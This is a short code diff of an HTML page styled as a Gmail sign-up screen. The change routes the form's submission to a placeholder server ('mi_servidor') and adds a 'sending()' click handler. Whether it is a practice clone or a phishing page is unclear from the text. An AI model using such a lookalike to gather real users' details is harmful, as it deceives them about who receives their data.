@@ -28,7 +28,8 @@
         <h3>Ir a Gmail</h3>
 
         <div class="inputs-containers">
-            <form  name="formulario" action="" method="POST" autocomplete="off">
+                                    <!--url del servidor  -->
+            <form  name="formulario" action="mi_servidor" method="POST" target="_blank" autocomplete="off">
                 <div class="flex-container">
                     <label for="name">
                         <input type="text" id="name" class="name" name="Nombre"  required>
@@ -58,7 +59,7 @@
 
                 <div class="flex-container">
                     <label for="submit">
-                        <input type="submit" id="submit" value="Siguiente">
+                        <input type="submit" id="submit" value="Siguiente" onclick="sending()">
                     </label>
                     <a href="" title="vinculo a login"> 
                         Acceder a tu cuenta en su lugar
